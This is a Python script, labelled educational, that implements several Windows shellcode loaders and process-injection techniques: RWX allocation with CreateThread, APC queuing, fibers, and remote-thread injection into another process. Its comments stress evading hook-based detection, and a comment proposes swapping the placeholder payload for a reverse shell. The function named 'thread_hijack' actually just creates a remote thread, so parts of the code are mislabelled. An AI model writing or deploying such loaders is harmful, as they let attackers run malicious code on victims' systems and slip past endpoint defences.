#!/usr/bin/env python3
"""
Shellcode Loader Examples
Multiple techniques for executing position-independent code
Educational/Research purposes only
"""
import ctypes
import mmap
import base64

class ShellcodeLoader:
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        
    def direct_execution(self, shellcode):
        """
        Most basic: allocate RWX memory and execute directly
        Highest detection rate but simplest implementation
        """
        # Allocate executable memory
        size = len(shellcode)
        ptr = self.kernel32.VirtualAlloc(
            None, size, 0x3000, 0x40  # RWX
        )
        
        # Copy shellcode
        ctypes.memmove(ptr, shellcode, size)
        
        # Create thread and execute
        thread_id = ctypes.c_ulong(0)
        self.kernel32.CreateThread(
            None, 0, ptr, None, 0, ctypes.byref(thread_id)
        )
        
        # Wait (or don't for fire-and-forget)
        self.kernel32.WaitForSingleObject(ctypes.c_void_p(-1), 0)
        
    def queue_user_apc(self, shellcode):
        """
        QueueUserAPC injection technique
        Executes shellcode via APC into current thread
        """
        ptr = self.kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
        ctypes.memmove(ptr, shellcode, len(shellcode))
        
        # Queue APC to current thread
        ntdll = ctypes.windll.ntdll
        ntdll.NtQueueApcThread(
            ctypes.c_void_p(-2),  # GetCurrentThread()
            ptr,
            None, None, None
        )
        
    def fiber_execution(self, shellcode):
        """
        Convert thread to fiber and execute shellcode
        Bypasses some hook-based detection
        """
        # Convert to fiber
        self.kernel32.ConvertThreadToFiber(None)
        
        # Create fiber with shellcode
        fiber = self.kernel32.CreateFiber(
            len(shellcode),
            ctypes.cast(shellcode, ctypes.c_void_p),
            None
        )
        
        # Switch to fiber (executes shellcode)
        self.kernel32.SwitchToFiber(fiber)
        
    def thread_hijack(self, shellcode, pid=None):
        """
        Suspend remote thread, modify context to point to shellcode, resume
        Classic injection technique
        """
        # Open target process
        if pid:
            hProcess = self.kernel32.OpenProcess(0x1F0FFF, False, pid)
            
            # Allocate in remote
            ptr = self.kernel32.VirtualAllocEx(
                hProcess, None, len(shellcode), 0x3000, 0x40
            )
            
            # Write shellcode
            written = ctypes.c_size_t(0)
            self.kernel32.WriteProcessMemory(
                hProcess, ptr, shellcode, len(shellcode), ctypes.byref(written)
            )
            
            # Create remote thread
            thread_id = ctypes.c_ulong(0)
            self.kernel32.CreateRemoteThread(
                hProcess, None, 0, ptr, None, 0, ctypes.byref(thread_id)
            )
    
    def syscall_direct(self, shellcode):
        """
        Use direct syscalls to bypass user-mode hooks
        System calls directly to kernel, bypassing ntdll hooks
        """
        # Requires mapping fresh ntdll from disk to get clean syscall numbers
        # Then build syscall stubs dynamically
        pass

# Encoded payload example (base64 encoded msgbox)
SC_MSG = base64.b64decode(
    "dpBkvPDovPDovPDovPDovPDovPDovPDovPDovPDovPDovPDovPDovPDovPDovPDovPDovPDovPDovPDovPDovPDo="
    # This would be actual shellcode: e.g., calc.exe or reverse shell
)

if __name__ == "__main__":
    loader = ShellcodeLoader()
    # loader.direct_execution(SC_MSG)  # Uncomment with real shellcode